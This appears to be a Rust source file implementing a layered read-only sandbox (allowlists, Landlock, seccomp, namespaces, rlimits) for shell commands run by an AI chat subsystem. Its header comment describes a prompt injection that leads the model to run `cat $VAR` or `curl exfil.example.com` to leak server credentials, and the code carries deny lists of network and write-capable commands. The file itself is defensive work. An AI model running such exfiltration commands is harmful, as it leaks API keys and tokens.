//! Read-only shell execution for the in-process chat subsystem.
//!
//! This sandbox is distinct from [`crate::linux::LandlockSandbox`]. That one
//! backs the worker/architect subprocesses and intentionally grants write
//! access to a task worktree, `/var/tmp`, the cargo shared build dir, and the
//! repo `.git/` — workers have to run `cargo test`, merge commits, etc.
//!
//! The chat sandbox is the opposite. It executes a shell argv on behalf of the
//! in-process chat handler against an ephemeral clone and must be read-only
//! everywhere, allow no network egress, deny privileged/namespaced syscalls,
//! and scrub every inherited environment variable — the djinn-server process
//! holds Anthropic API keys, GitHub App tokens, and Dolt credentials in its
//! env, and a prompt injection that convinces the model to run `cat $VAR` or
//! `curl exfil.example.com` must not be able to leak them.
//!
//! # Layered defenses (belt and braces)
//!
//! Each layer is independently sufficient for its class; any single layer
//! failing still leaves the others in place. Layers, in the order applied:
//!
//! 1. **Argv allowlist.** No shell interpreter (`sh`, `bash`) is reachable;
//!    the first token must be on a fixed read-only command list, and
//!    `git` / `find` subcommands get extra filtering. `argv[0]` containing
//!    `\0` or an empty argv is rejected up front.
//! 2. **cwd validation.** Any requested cwd is canonicalized and asserted to
//!    be a subpath of the clone root. `/etc`, `/proc`, or a symlink out is
//!    caught before the child is spawned.
//! 3. **Env scrub.** `env_clear()` + a minimal allowlist (`PATH`, `HOME`,
//!    `LANG`, `LC_ALL`, `TERM`, `GIT_TERMINAL_PROMPT`, `GIT_ASKPASS`).
//! 4. **Namespaces (best-effort).** `unshare(CLONE_NEWUSER | CLONE_NEWNET |
//!    CLONE_NEWPID)` in `pre_exec`. If user-ns is unavailable (sysctl
//!    `kernel.unprivileged_userns_clone=0`, or we're running inside a
//!    container that already dropped the cap), we fall through — the other
//!    layers still apply. See [`NAMESPACE_PROBE`] for the detection logic.
//! 5. **Landlock v3.** `AccessFs::ReadDir | Execute` on `/` plus `ReadFile`
//!    on everything except [`crate::confidential::CONFIDENTIAL_ROOTS`], and
//!    no write rules anywhere. Applied via `restrict_self()` in the child.
//!    Withholding `ReadFile` on the confidential mounts is task jqvg: a
//!    blanket `ReadFile` on `/` let a chat `cat` reach the task-run Pod's
//!    credential Secret and projected ServiceAccount token, and Landlock is
//!    additive so the exception cannot be carved out of a `/` grant.
//! 6. **Seccomp-bpf.** Errno-denies a hard deny list covering ptrace,
//!    module loading, pivot_root, bpf, perf_event_open, and friends.
//! 7. **rlimits.** `RLIMIT_AS=512 MiB`, `RLIMIT_CPU=20s`,
//!    `RLIMIT_FSIZE=0` (belt-and-braces against missed write paths),
//!    `RLIMIT_NOFILE=256`, `RLIMIT_CORE=0`.
//! 8. **Wall-clock timeout.** `tokio::time::timeout(30s)` around
//!    `wait_with_output`; on expiry the child is killed and `timed_out` is
//!    reported on the result.
//! 9. **Output cap.** Stdout and stderr are each capped at 1 MiB with a
//!    truncation footer so a rogue `find /` cannot blow the tool buffer.
//!
//! # Namespace fallback
//!
//! `CLONE_NEWUSER` requires either `CAP_SYS_ADMIN` or that the running kernel
//! allow unprivileged user namespaces (the typical default, but some hardened
//! distros and some Kubernetes default pod securityContexts disable it). The
//! parent process runs a one-shot probe at first sandbox construction and
//! caches the result in a `OnceLock`; if the probe fails, we skip the
//! `unshare` in `pre_exec` and rely on Landlock + seccomp + rlimits + env
//! scrub + argv allowlist. The child will still see the parent's network
//! stack and `/proc` tree in that case, so the argv allowlist (no `curl`, no
//! `nc`, no `getent`, no `nslookup`, no `ss`, no `ip`) and the seccomp deny
//! of `socket`-adjacent privileged syscalls carry the network-egress risk.
//! Logs a `warn!` from the parent once per process lifetime.
//!
//! # /proc remount
//!
//! If we do enter a PID namespace, the child's `/proc` is still the parent's
//! `/proc` (mount points are not cloned by `unshare`). Remounting a fresh
//! `/proc` would require `CAP_SYS_ADMIN` in a mount namespace, which would
//! mean also calling `unshare(CLONE_NEWNS)` and `mount("proc", "/proc",
//! "proc", ...)`. We deliberately do not do that — it escalates the
//! capability requirement beyond what user-ns alone buys us. Acceptable
//! consequence: `/proc/<pid>/` entries for non-child processes remain
//! visible inside the new PID namespace via the old mount, but PID 1 from
//! the child's point of view is the child itself, and the Landlock rules
//! prevent writes to `/proc/self/*` that could bypass the env scrub. The
//! env-leak surface is closed by `env_clear()`; PID-namespace isolation is
//! belt-and-braces for that.

#![cfg(target_os = "linux")]
// Wired into chat dispatch in commits 5 and 6; until then the public API is
// referenced only by the test module and pre_exec closures, so rustc flags
// every item as "never used" from the static-analysis point of view. Follow
// the `project_knowledge_extraction_deferral` pattern: silence the
// pipeline-wide dead-code warnings at module scope while the rewire lands.
#![allow(dead_code)]

use std::io;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::OnceLock;
use std::time::Duration;

use djinn_core::clock::{Clock, SystemClock};

use landlock::{
    ABI, Access, AccessFs, PathBeneath, PathFd, Ruleset, RulesetAttr, RulesetCreatedAttr,
};
use seccompiler::{BpfProgram, SeccompAction, SeccompFilter};
use tokio::io::AsyncReadExt;
use tokio::process::Command;

/// Maximum bytes captured per stream (stdout, stderr) before truncation.
const OUTPUT_CAP_BYTES: usize = 1024 * 1024;

/// Wall-clock timeout for the whole shell invocation.
const WALL_CLOCK_TIMEOUT: Duration = Duration::from_secs(30);

/// Evidence callers may choose a smaller bound, never a larger one.
pub const EVIDENCE_MAX_TIMEOUT: Duration = Duration::from_secs(30);
/// Evidence callers may choose a smaller capture limit, never a larger one.
pub const EVIDENCE_MAX_OUTPUT_BYTES: usize = OUTPUT_CAP_BYTES;

/// Truncation footer appended to stdout/stderr when the cap is hit.
const TRUNCATION_FOOTER: &[u8] = b"\n[...truncated at 1 MiB...]\n";

/// Address-space rlimit, bytes. 512 MiB.
const RLIMIT_AS_BYTES: u64 = 512 * 1024 * 1024;
/// CPU-time rlimit, seconds.
const RLIMIT_CPU_SECS: u64 = 20;
/// Max file size the child is allowed to create. Zero — read-only sandbox.
const RLIMIT_FSIZE_BYTES: u64 = 0;
/// Max open file descriptors.
const RLIMIT_NOFILE: u64 = 256;
/// Core dump size. Zero.
const RLIMIT_CORE_BYTES: u64 = 0;

/// First-token allowlist. Must stay in sync with the chat tool schema.
const COMMAND_ALLOWLIST: &[&str] = &[
    "cat", "ls", "find", "grep", "rg", "head", "tail", "wc", "sort", "uniq", "tr", "awk", "sed",
    "jq", "file", "stat", "du", "tree", "git", "env", "echo", "printf", "pwd", "basename",
    "dirname", "realpath", "readlink", "true", "false", "test", "[", "xargs", "date",
];

/// `git` subcommand sub-allowlist. Enforced after the first-token check when
/// argv[0] == "git".
const GIT_SUB_ALLOWLIST: &[&str] = &[
    "log",
    "show",
    "blame",
    "diff",
    "ls-tree",
    "ls-files",
    "cat-file",
    "rev-parse",
    "status",
    "branch",
    "config",
    "--get",
    "--get-all",
    "describe",
    "name-rev",
    "reflog",
    "shortlog",
];

/// `git` subcommand explicit deny list — belt-and-braces against any future
/// accidental addition to the allowlist.
const GIT_SUB_DENYLIST: &[&str] = &[
    "fetch",
    "pull",
    "push",
    "clone",
    "init",
    "reset",
    "checkout",
    "commit",
    "rebase",
    "merge",
    "remote",
    "am",
    "apply",
    "cherry-pick",
    "revert",
    "restore",
    "worktree",
    "update-ref",
    "update-index",
    "gc",
    "prune",
];

/// `find` argument deny list. `-exec`/`-execdir` can run arbitrary binaries;
/// `-delete`/`-fprint*` can write.
const FIND_ARG_DENYLIST: &[&str] = &[
    "-exec", "-execdir", "-delete", "-fprint", "-fprintf", "-fprint0",
];

/// Probe result for unprivileged namespace support.
///
/// `None` until the first probe; once probed, `Some(true)` if user-ns +
/// network-ns + pid-ns can be unshared unprivileged, `Some(false)` otherwise.
static NAMESPACE_PROBE: OnceLock<bool> = OnceLock::new();

/// Read-only shell sandbox for a single ephemeral chat clone.
///
/// Construct one per tool call with the clone root. The struct is cheap
/// (it holds a `PathBuf`); re-creating per call keeps lifetime tight.
pub struct ChatShellSandbox {
    clone_root: PathBuf,
}

impl ChatShellSandbox {
    /// Build a sandbox for the given workspace clone directory.
    ///
    /// `clone_root` must already exist; this constructor does **not** create
    /// it. Typical callers obtain it from
    /// `djinn_workspace::WorkspaceStore::ensure_workspace`.
    pub fn new(clone_root: PathBuf) -> Self {
        // Run the namespace probe as soon as we have a sandbox — the result
        // is cached in a `OnceLock`, so subsequent constructions are free.
        let _ = probe_namespaces();
        Self { clone_root }
    }

    /// Execute a shell request under the full layered policy.
    pub async fn run(&self, req: ChatShellRequest) -> Result<ChatShellResult, ChatShellError> {
        validate_argv(&req.argv)?;
        let cwd = resolve_cwd(&self.clone_root, req.cwd.as_deref())?;
        run_isolated(
            &req.argv[0],
            &req.argv[1..],
            &cwd,
            req.stdin,
            WALL_CLOCK_TIMEOUT,
            OUTPUT_CAP_BYTES,
            probe_namespaces(),
        )
        .await
    }
}

/// Closed, read-only executor for reviewed refinement-evidence commands.
/// It has a typed request without stdin and fails closed without namespaces.
pub struct EvidenceSandbox {
    clone_root: PathBuf,
}

impl EvidenceSandbox {
    pub fn new(clone_root: PathBuf) -> Self {
        let _ = probe_namespaces();
        Self { clone_root }
    }

    pub async fn run(&self, req: EvidenceRequest) -> Result<ChatShellResult, EvidenceError> {
        let executable = validate_evidence_argv(&req.argv)?;
        let cwd = resolve_cwd(&self.clone_root, req.cwd.as_deref()).map_err(EvidenceError::Core)?;
        if req.timeout.is_zero() || req.timeout > EVIDENCE_MAX_TIMEOUT {
            return Err(EvidenceError::TimeoutOutOfBounds);
        }
        if req.output_limit == 0 || req.output_limit > EVIDENCE_MAX_OUTPUT_BYTES {
            return Err(EvidenceError::OutputLimitOutOfBounds);
        }
        require_evidence_namespaces(probe_namespaces())?;
        run_isolated(
            executable,
            &req.argv[1..],
            &cwd,
            None,
            req.timeout,
            req.output_limit,
            true,
        )
        .await
        .map_err(EvidenceError::Core)
    }
}

/// Evidence request deliberately has no stdin or executable-path field.
pub struct EvidenceRequest {
    pub argv: Vec<String>,
    pub cwd: Option<PathBuf>,
    pub timeout: Duration,
    pub output_limit: usize,
}

#[derive(Debug, thiserror::Error)]
pub enum EvidenceError {
    #[error("invalid evidence argv: {0}")]
    InvalidArgv(String),
    #[error("evidence namespace isolation is unavailable")]
    NamespaceUnavailable,
    #[error("evidence timeout exceeds server bound")]
    TimeoutOutOfBounds,
    #[error("evidence output limit exceeds server bound")]
    OutputLimitOutOfBounds,
    #[error(transparent)]
    Core(#[from] ChatShellError),
}

/// Keep evidence namespace handling independently testable and fail closed.
fn require_evidence_namespaces(available: bool) -> Result<(), EvidenceError> {
    if available {
        Ok(())
    } else {
        Err(EvidenceError::NamespaceUnavailable)
    }
}

/// Shared Linux process/isolation core. Policy is selected before this boundary.
async fn run_isolated(
    program: &str,
    args: &[String],
    cwd: &Path,
    stdin_bytes: Option<Vec<u8>>,
    timeout: Duration,
    output_cap: usize,
    namespaces_ok: bool,
) -> Result<ChatShellResult, ChatShellError> {
    let read_file_cover = crate::confidential::read_file_cover(
        &crate::confidential::present_confidential_roots(crate::confidential::CONFIDENTIAL_ROOTS),
    );
    let mut cmd = Command::new(program);
    cmd.args(args)
        .current_dir(cwd)
        .stdin(if stdin_bytes.is_some() {
            Stdio::piped()
        } else {
            Stdio::null()
        })
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    cmd.env_clear();
    cmd.env("PATH", "/usr/bin:/bin:/usr/local/bin");
    cmd.env("HOME", "/tmp");
    cmd.env("LANG", "C.UTF-8");
    cmd.env("LC_ALL", "C.UTF-8");
    cmd.env("TERM", "dumb");
    cmd.env("GIT_TERMINAL_PROMPT", "0");
    cmd.env("GIT_ASKPASS", "/bin/true");
    unsafe {
        cmd.pre_exec(move || {
            if namespaces_ok {
                enter_namespaces()?;
            }
            apply_landlock(&read_file_cover)?;
            apply_seccomp()?;
            apply_rlimits()?;
            Ok(())
        });
    }
    let started = SystemClock::new().now_instant();
    let mut child = cmd.spawn().map_err(ChatShellError::SpawnFailed)?;
    if let Some(stdin_bytes) = stdin_bytes
        && let Some(mut stdin) = child.stdin.take()
    {
        use tokio::io::AsyncWriteExt;
        let _ = stdin.write_all(&stdin_bytes).await;
        let _ = stdin.shutdown().await;
    }
    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdout_task = tokio::spawn(read_capped(stdout, output_cap));
    let stderr_task = tokio::spawn(read_capped(stderr, output_cap));
    let wait_result = tokio::time::timeout(timeout, child.wait()).await;
    let (exit_status, timed_out) = match wait_result {
        Ok(Ok(status)) => (Some(status), false),
        Ok(Err(e)) => return Err(ChatShellError::SpawnFailed(e)),
        Err(_) => {
            let _ = child.start_kill();
            let _ = child.wait().await;
            (None, true)
        }
    };
    let (stdout, stdout_trunc) = stdout_task.await.unwrap_or_else(|_| (Vec::new(), false));
    let (stderr, stderr_trunc) = stderr_task.await.unwrap_or_else(|_| (Vec::new(), false));
    Ok(ChatShellResult {
        exit_code: exit_status.and_then(|s| s.code()),
        stdout,
        stderr,
        truncated: stdout_trunc || stderr_trunc,
        timed_out,
        elapsed: started.elapsed(),
    })
}

/// Shell invocation request.
pub struct ChatShellRequest {
    /// Argv. `argv[0]` must be on `COMMAND_ALLOWLIST`.
    pub argv: Vec<String>,
    /// Optional working directory. Must canonicalize to a subpath of the
    /// sandbox's clone_root; defaults to clone_root.
    pub cwd: Option<PathBuf>,
    /// Optional stdin bytes fed to the child. `None` uses `/dev/null`.
    pub stdin: Option<Vec<u8>>,
}

/// Shell invocation result.
#[derive(Debug)]
pub struct ChatShellResult {
    /// Exit code, or `None` if the child was killed (signal or wall-clock
    /// timeout).
    pub exit_code: Option<i32>,
    /// Captured stdout, capped at 1 MiB + footer if truncated.
    pub stdout: Vec<u8>,
    /// Captured stderr, capped at 1 MiB + footer if truncated.
    pub stderr: Vec<u8>,
    /// `true` if stdout or stderr was truncated.
    pub truncated: bool,
    /// `true` if the wall-clock timeout fired.
    pub timed_out: bool,
    /// Time spent running the child (excludes spawn overhead from the
    /// caller's point of view).
    pub elapsed: Duration,
}

/// Errors from argv validation or sandbox setup.
#[derive(Debug, thiserror::Error)]
pub enum ChatShellError {
    /// First token not on the allowlist, or a git/find filter rejected it.
    #[error("disallowed command: {0}")]
    DisallowedCommand(String),
    /// Argv was empty, or an element contained a NUL byte.
    #[error("invalid argv")]
    InvalidArgv,
    /// Requested cwd canonicalized outside `clone_root`.
    #[error("cwd escaped clone root")]
    CwdOutsideClone,
    /// Failed to spawn or wait on the child.
    #[error("spawn failed: {0}")]
    SpawnFailed(#[from] io::Error),
    /// Tokio task join failure while reading output.
    #[error("interrupted")]
    Interrupted,
}

// ─── Argv validation ──────────────────────────────────────────────────────────

fn validate_argv(argv: &[String]) -> Result<(), ChatShellError> {
    if argv.is_empty() {
        return Err(ChatShellError::InvalidArgv);
    }
    for a in argv {
        if a.contains('\0') {
            return Err(ChatShellError::InvalidArgv);
        }
    }
    let cmd = argv[0].as_str();
    if !COMMAND_ALLOWLIST.contains(&cmd) {
        return Err(ChatShellError::DisallowedCommand(cmd.to_string()));
    }
    match cmd {
        "git" => validate_git(argv)?,
        "find" => validate_find(argv)?,
        _ => {}
    }
    Ok(())
}

// ─── Closed evidence argv policy ──────────────────────────────────────────────

/// Resolve only reviewed names to server-owned executable locations. These are
/// deliberately not discovered through PATH and are never caller supplied.
fn validate_evidence_argv(argv: &[String]) -> Result<&'static str, EvidenceError> {
    let (name, executable) = match argv.first().map(String::as_str) {
        Some("cat") => ("cat", "/usr/bin/cat"),
        Some("ls") => ("ls", "/usr/bin/ls"),
        Some("grep") => ("grep", "/usr/bin/grep"),
        Some("head") => ("head", "/usr/bin/head"),
        Some("tail") => ("tail", "/usr/bin/tail"),
        Some("wc") => ("wc", "/usr/bin/wc"),
        Some("sort") => ("sort", "/usr/bin/sort"),
        Some("uniq") => ("uniq", "/usr/bin/uniq"),
        Some("tr") => ("tr", "/usr/bin/tr"),
        Some("jq") => ("jq", "/usr/bin/jq"),
        Some("file") => ("file", "/usr/bin/file"),
        Some("stat") => ("stat", "/usr/bin/stat"),
        Some("du") => ("du", "/usr/bin/du"),
        Some("tree") => ("tree", "/usr/bin/tree"),
        Some(other) => {
            return Err(EvidenceError::InvalidArgv(format!(
                "unreviewed executable {other}"
            )));
        }
        None => return Err(EvidenceError::InvalidArgv("empty argv".into())),
    };
    let args = &argv[1..];
    for arg in args {
        if arg.contains('\0')
            || arg.contains('\n')
            || arg.contains('\r')
            || [">", "<", "|", ";", "&", "`", "$(", "${"]
                .iter()
                .any(|s| arg.contains(s))
        {
            return Err(EvidenceError::InvalidArgv(
                "shell/redirection syntax".into(),
            ));
        }
        if arg.starts_with('/') || arg.split('/').any(|part| part == "..") {
            return Err(EvidenceError::InvalidArgv("path escapes clone".into()));
        }
        if matches!(
            arg.as_str(),
            "-o" | "--output"
                | "--output-file"
                | "--in-place"
                | "--config"
                | "--rcfile"
                | "--plugin"
                | "--pager"
                | "--pre"
                | "--exec"
                | "--command"
                | "--from-file"
                | "--argfile"
                | "--rawfile"
                | "--slurpfile"
        ) {
            return Err(EvidenceError::InvalidArgv(format!(
                "forbidden option {arg}"
            )));
        }
    }
    let valid = match name {
        "cat" => options_only(args, &[]),
        "ls" => options_only(
            args,
            &[
                "-a",
                "-l",
                "-h",
                "-1",
                "-la",
                "-al",
                "--all",
                "--long",
                "--human-readable",
            ],
        ),
        "grep" => grep_args(args),
        "head" | "tail" => count_args(args),
        "wc" => options_only(args, &["-l", "-w", "-c", "-m", "-L", "-lw", "-lc"]),
        "sort" => options_only(
            args,
            &[
                "-b", "-d", "-f", "-g", "-h", "-M", "-n", "-r", "-R", "-s", "-u",
            ],
        ),
        // GNU uniq treats its second positional operand as an output file.
        // Do not leave that distinction to Landlock: evidence policy must
        // reject the write surface before a child process is spawned.
        "uniq" => uniq_args(args),
        "tr" => options_only(args, &["-c", "-C", "-d", "-s", "-t", "-cd", "-ds", "-sd"]),
        "jq" => jq_args(args),
        "file" => options_only(
            args,
            &["-b", "-i", "-L", "-z", "--brief", "--mime", "--mime-type"],
        ),
        "stat" => options_with_values(args, &["-L", "--dereference"], &["-c", "--format"]),
        "du" => options_with_values(
            args,
            &["-a", "-h", "-s", "-x", "-sh", "-hs"],
            &["--max-depth"],
        ),
        "tree" => options_with_values(args, &["-a", "-d", "-h"], &["-L"]),
        _ => unreachable!(),
    };
    valid.map_err(EvidenceError::InvalidArgv)?;
    Ok(executable)
}

fn options_only(args: &[String], allowed: &[&str]) -> Result<(), String> {
    for arg in args {
        if arg.starts_with('-') && arg != "--" && !allowed.contains(&arg.as_str()) {
            return Err(format!("unknown option {arg}"));
        }
    }
    Ok(())
}
fn options_with_values(args: &[String], flags: &[&str], values: &[&str]) -> Result<(), String> {
    let mut need_value = false;
    for arg in args {
        if need_value {
            need_value = false;
            continue;
        }
        if values.contains(&arg.as_str()) {
            need_value = true;
        } else if arg.starts_with('-') && arg != "--" && !flags.contains(&arg.as_str()) {
            return Err(format!("unknown option {arg}"));
        }
    }
    if need_value {
        Err("option missing value".into())
    } else {
        Ok(())
    }
}

/// Validate the read-only subset of `uniq [OPTION]... [INPUT [OUTPUT]]`.
///
/// The sole optional positional operand is the input file. A second operand
/// is an output file in GNU uniq, so accepting it would expose a write mode.
fn uniq_args(args: &[String]) -> Result<(), String> {
    let mut need_value = false;
    let mut options_ended = false;
    let mut positional_count = 0;

    for arg in args {
        if need_value {
            need_value = false;
            continue;
        }
        if !options_ended && arg == "--" {
            options_ended = true;
        } else if !options_ended && ["-f", "-s", "-w"].contains(&arg.as_str()) {
            need_value = true;
        } else if !options_ended && ["-c", "-d", "-u", "-i"].contains(&arg.as_str()) {
            continue;
        } else if !options_ended && arg.starts_with('-') {
            return Err(format!("unknown option {arg}"));
        } else {
            positional_count += 1;
            if positional_count > 1 {
                return Err("uniq output operand is not allowed".into());
            }
        }
    }

    if need_value {
        Err("option missing value".into())
    } else {
        Ok(())
    }
}

fn grep_args(args: &[String]) -> Result<(), String> {
    options_only(
        args,
        &[
            "-E", "-F", "-i", "-n", "-H", "-h", "-v", "-w", "-x", "-c", "-l",
        ],
    )?;
    if args.iter().any(|arg| !arg.starts_with('-')) {
        Ok(())
    } else {
        Err("grep requires pattern".into())
    }
}
fn count_args(args: &[String]) -> Result<(), String> {
    let mut need_count = false;
    for arg in args {
        if need_count {
            if arg.parse::<u64>().is_err() {
                return Err("count must be numeric".into());
            }
            need_count = false;
        } else if arg == "-n" {
            need_count = true;
        } else if arg.starts_with("-n") && arg.len() > 2 {
            if arg[2..].parse::<u64>().is_err() {
                return Err("count must be numeric".into());
            }
        } else if arg.starts_with('-') && arg != "--" {
            return Err(format!("unknown option {arg}"));
        }
    }
    if need_count {
        Err("-n missing count".into())
    } else {
        Ok(())
    }
}
fn jq_args(args: &[String]) -> Result<(), String> {
    options_only(args, &["-r", "-c", "-M", "-S", "-e", "-s"])?;
    if args.iter().any(|arg| !arg.starts_with('-')) {
        Ok(())
    } else {
        Err("jq requires filter".into())
    }
}

fn validate_git(argv: &[String]) -> Result<(), ChatShellError> {
    // Any git subcommand must be on the sub-allowlist. `git` with no
    // subcommand prints help — harmless; allow it.
    if argv.len() < 2 {
        return Ok(());
    }
    let sub = argv[1].as_str();
    if GIT_SUB_DENYLIST.contains(&sub) {
        return Err(ChatShellError::DisallowedCommand(format!("git {sub}")));
    }
    if !GIT_SUB_ALLOWLIST.contains(&sub) {
        return Err(ChatShellError::DisallowedCommand(format!("git {sub}")));
    }
    Ok(())
}

fn validate_find(argv: &[String]) -> Result<(), ChatShellError> {
    for a in &argv[1..] {
        let a = a.as_str();
        if FIND_ARG_DENYLIST.contains(&a) {
            return Err(ChatShellError::DisallowedCommand(format!("find {a}")));
        }
        // `-fprint`, `-fprintf`, `-fprint0` all start with `-fprint` — catch
        // any forms not covered by exact-match above.
        if a.starts_with("-fprint") {
            return Err(ChatShellError::DisallowedCommand(format!("find {a}")));
        }
    }
    Ok(())
}

// ─── cwd validation ───────────────────────────────────────────────────────────

fn resolve_cwd(clone_root: &Path, requested: Option<&Path>) -> Result<PathBuf, ChatShellError> {
    let requested = requested.unwrap_or(clone_root);
    let canon_root = clone_root
        .canonicalize()
        .map_err(|_| ChatShellError::CwdOutsideClone)?;
    let canon_req = requested
        .canonicalize()
        .map_err(|_| ChatShellError::CwdOutsideClone)?;
    if !canon_req.starts_with(&canon_root) {
        return Err(ChatShellError::CwdOutsideClone);
    }
    Ok(canon_req)
}

// ─── Namespace probe ──────────────────────────────────────────────────────────

/// Probe whether unprivileged namespace creation is available.
///
/// Runs the probe at most once per process. The probe forks a throwaway
/// child that attempts `unshare(CLONE_NEWUSER|CLONE_NEWNET|CLONE_NEWPID)`
/// and exits with a conventional status; the parent observes the exit
/// status. If fork fails outright, treat as "not available" — sandbox
/// degradation is the safe fallback.
fn probe_namespaces() -> bool {
    *NAMESPACE_PROBE.get_or_init(run_namespace_probe)
}

fn run_namespace_probe() -> bool {
    // SAFETY: fork(2) is an async-signal-safe syscall. The child path
    // performs only a single unshare and _exit; the parent path only
    // performs waitpid. No tracing, allocator, or tokio locks are held
    // across the fork.
    let pid = unsafe { libc::fork() };
    if pid < 0 {
        tracing::warn!(
            "chat_shell sandbox: fork() failed during namespace probe; \
             disabling unshare path"
        );
        return false;
    }
    if pid == 0 {
        // Child: try the unshare, exit 0 on success, 1 on failure.
        let flags = libc::CLONE_NEWUSER | libc::CLONE_NEWNET | libc::CLONE_NEWPID;
        let ret = unsafe { libc::unshare(flags) };
        unsafe { libc::_exit(if ret == 0 { 0 } else { 1 }) };
    }
    // Parent: wait for the child.
    let mut status: libc::c_int = 0;
    let wait_ret = unsafe { libc::waitpid(pid, &mut status, 0) };
    if wait_ret < 0 {
        return false;
    }
    let ok = libc::WIFEXITED(status) && libc::WEXITSTATUS(status) == 0;
    if !ok {
        tracing::warn!(
            "chat_shell sandbox: unprivileged namespaces unavailable \
             (kernel.unprivileged_userns_clone=0 or container drops CAP_SYS_ADMIN); \
             falling back to Landlock + seccomp + rlimits + env scrub only"
        );
    }
    ok
}

// ─── pre_exec helpers (async-signal-safe only) ────────────────────────────────

fn enter_namespaces() -> io::Result<()> {
    let flags = libc::CLONE_NEWUSER | libc::CLONE_NEWNET | libc::CLONE_NEWPID;
    let ret = unsafe { libc::unshare(flags) };
    if ret != 0 {
        return Err(io::Error::last_os_error());
    }
    Ok(())
}

fn apply_landlock(read_file_cover: &[PathBuf]) -> io::Result<()> {
    let abi = ABI::V3;
    let full = AccessFs::from_all(abi);
    let read_exec = AccessFs::Execute | AccessFs::ReadFile | AccessFs::ReadDir;
    // Traverse, list and execute stay granted on all of `/`; only file-content
    // reads are withheld, and only beneath the confidential mounts (jqvg).
    let traverse_exec = AccessFs::Execute | AccessFs::ReadDir;

    let root = PathFd::new("/")
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;

    let mut ruleset = Ruleset::default()
        .handle_access(full)
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?
        .create()
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?
        .add_rule(PathBeneath::new(root, traverse_exec))
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;

    // `read_file_cover` is `["/"]` on any host without the Pod secret mounts,
    // which reproduces the previous blanket read grant exactly. A path that
    // vanished since the parent enumerated it is skipped — we cannot log from
    // `pre_exec`, and a missing path grants nothing.
    for path in read_file_cover {
        if let Ok(fd) = PathFd::new(path) {
            ruleset = ruleset
                .add_rule(PathBeneath::new(fd, read_exec))
                .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;
        }
    }

    ruleset
        .restrict_self()
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;
    Ok(())
}

fn apply_seccomp() -> io::Result<()> {
    // SYS_create_module is marked deprecated in libc but kernels still
    // reserve the number and a rogue LKM could still call it; keep it on
    // the deny list as defense-in-depth. Same for _sysctl.
    // `mut` is used only on x86_64, where the arch-specific `deny.extend(...)`
    // below runs; on other arches (e.g. aarch64) that block is cfg'd out and
    // the binding is never mutated, so silence unused_mut there.
    #[cfg_attr(not(target_arch = "x86_64"), allow(unused_mut))]
    let mut deny: Vec<i64> = vec![
        libc::SYS_ptrace,
        libc::SYS_mount,
        libc::SYS_umount2,
        libc::SYS_reboot,
        libc::SYS_kexec_load,
        libc::SYS_kexec_file_load,
        libc::SYS_init_module,
        libc::SYS_finit_module,
        libc::SYS_delete_module,
        libc::SYS_pivot_root,
        libc::SYS_setns,
        libc::SYS_unshare,
        libc::SYS_perf_event_open,
        libc::SYS_bpf,
        libc::SYS_swapon,
        libc::SYS_swapoff,
    ];
    // Legacy syscalls that only ever existed in the x86_64 table; aarch64
    // never allocated numbers for them, so libc has no constants there and
    // denying them is a no-op anyway.
    #[cfg(target_arch = "x86_64")]
    #[allow(deprecated)]
    deny.extend([
        libc::SYS_create_module,
        libc::SYS_ioperm,
        libc::SYS_iopl,
        libc::SYS_uselib,
        libc::SYS_sysfs,
        libc::SYS__sysctl,
    ]);

    let rules = deny.iter().map(|n| (*n, Vec::new())).collect();

    let arch: seccompiler::TargetArch = std::env::consts::ARCH
        .try_into()
        .map_err(|e: seccompiler::BackendError| io::Error::other(format!("seccomp arch: {e}")))?;

    let filter = SeccompFilter::new(
        rules,
        // mismatch_action = Allow (syscalls not in the rule map proceed normally)
        SeccompAction::Allow,
        // match_action = Errno(EPERM) for our deny list
        SeccompAction::Errno(libc::EPERM as u32),
        arch,
    )
    .map_err(|e| io::Error::other(format!("seccomp filter: {e}")))?;

    let program: BpfProgram = filter.try_into().map_err(|e: seccompiler::BackendError| {
        io::Error::other(format!("seccomp compile: {e}"))
    })?;

    seccompiler::apply_filter(&program).map_err(|e| {
        io::Error::new(
            io::ErrorKind::PermissionDenied,
            format!("seccomp apply: {e}"),
        )
    })?;
    Ok(())
}

fn apply_rlimits() -> io::Result<()> {
    set_rlimit(libc::RLIMIT_AS, RLIMIT_AS_BYTES)?;
    set_rlimit(libc::RLIMIT_CPU, RLIMIT_CPU_SECS)?;
    set_rlimit(libc::RLIMIT_FSIZE, RLIMIT_FSIZE_BYTES)?;
    set_rlimit(libc::RLIMIT_NOFILE, RLIMIT_NOFILE)?;
    set_rlimit(libc::RLIMIT_CORE, RLIMIT_CORE_BYTES)?;
    Ok(())
}

fn set_rlimit(resource: libc::__rlimit_resource_t, value: u64) -> io::Result<()> {
    let lim = libc::rlimit {
        rlim_cur: value as libc::rlim_t,
        rlim_max: value as libc::rlim_t,
    };
    let ret = unsafe { libc::setrlimit(resource, &lim) };
    if ret != 0 {
        return Err(io::Error::last_os_error());
    }
    Ok(())
}

// ─── Output capture ───────────────────────────────────────────────────────────

/// Read from a pipe into a capped buffer; keep draining past the cap so
/// the child doesn't block on a full pipe. Returns `(bytes, truncated)`.
async fn read_capped<R: AsyncReadExt + Unpin>(mut reader: R, output_cap: usize) -> (Vec<u8>, bool) {
    let mut out = Vec::with_capacity(8192);
    let mut chunk = [0u8; 8192];
    let mut truncated = false;
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => {
                if out.len() < output_cap {
                    let take = (output_cap - out.len()).min(n);
                    out.extend_from_slice(&chunk[..take]);
                    if take < n {
                        truncated = true;
                    }
                } else {
                    truncated = true;
                    // keep reading-to-discard
                }
            }
            Err(_) => break,
        }
    }
    if truncated {
        out.extend_from_slice(TRUNCATION_FOOTER);
    }
    (out, truncated)
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
#[cfg(target_os = "linux")]
#[allow(clippy::disallowed_methods, clippy::print_stderr)] // test diagnostics for sandbox availability
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

